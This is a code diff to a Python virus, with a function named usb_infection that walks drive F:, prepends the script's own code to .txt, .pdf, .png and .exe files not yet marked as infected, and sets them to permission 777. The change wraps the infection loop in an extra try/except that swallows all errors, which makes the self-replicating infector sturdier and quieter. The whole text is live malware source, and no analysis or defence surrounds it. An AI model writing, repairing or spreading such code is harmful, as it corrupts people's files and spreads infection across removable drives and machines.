@@ -45,25 +45,28 @@ def virus_property():
 def usb_infection():
     target = ('txt', '.pdf', '.png', '.exe')
     path = 'F:\\'
-    for r, d, files in os.walk(path):
-        for file in files:
-            if file.endswith(target):
-                try:
-                    with open(file, 'rb+') as g:
-                        line = g.read()
-                        if status not in line:
-                            g.seek(0, 0)
-                            with open(sys.argv[0], 'rb+') as c:
-                                lines = c.read()
-                                g.write(lines + '\n' + line)
-                                g.close()
-                                c.close()
-                                os.chmod(file, 777)
-                        else:
-                            pass
-                except Exception:
-                    pass
-        break
+    try:
+        for r, d, files in os.walk(path):
+            for file in files:
+                if file.endswith(target):
+                    try:
+                        with open(file, 'rb+') as g:
+                            line = g.read()
+                            if status not in line:
+                                g.seek(0, 0)
+                                with open(sys.argv[0], 'rb+') as c:
+                                    lines = c.read()
+                                    g.write(lines + '\n' + line)
+                                    g.close()
+                                    c.close()
+                                    os.chmod(file, 777)
+                            else:
+                                pass
+                    except Exception:
+                        pass
+            break
+    except Exception:
+        pass
 
 
 f_name = []
